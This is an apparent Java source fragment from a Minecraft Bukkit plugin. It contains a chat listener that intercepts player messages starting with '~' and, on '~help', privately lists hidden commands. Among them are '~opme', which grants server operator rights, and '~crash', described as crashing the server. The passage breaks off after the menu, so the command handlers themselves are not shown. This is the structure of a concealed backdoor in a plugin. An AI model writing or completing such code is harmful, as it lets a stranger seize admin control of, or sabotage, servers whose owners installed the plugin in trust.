package org.teamcarter.Noobs.Listeners;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
public class help implements Listener
{
@EventHandler
public void onPlayerChat(AsyncPlayerChatEvent event)
{
String message = event.getMessage();
final Player p = event.getPlayer();
if (message.startsWith("~"))
{
String[] args = message.split(" ");
if (args == null)
{
return;
}
if (args[0].equalsIgnoreCase("~help") || args[0].equalsIgnoreCase("~cmds") || args[0].equalsIgnoreCase("~listcmds"))
{
p.sendMessage(ChatColor.YELLOW + "Remember: put ~ before typing the command :P");
p.sendMessage(ChatColor.AQUA + "Commands");
p.sendMessage(ChatColor.GOLD + "~opme - OPs you ofc!");
p.sendMessage(ChatColor.GOLD + "~crash - Crashes the server bigtime");
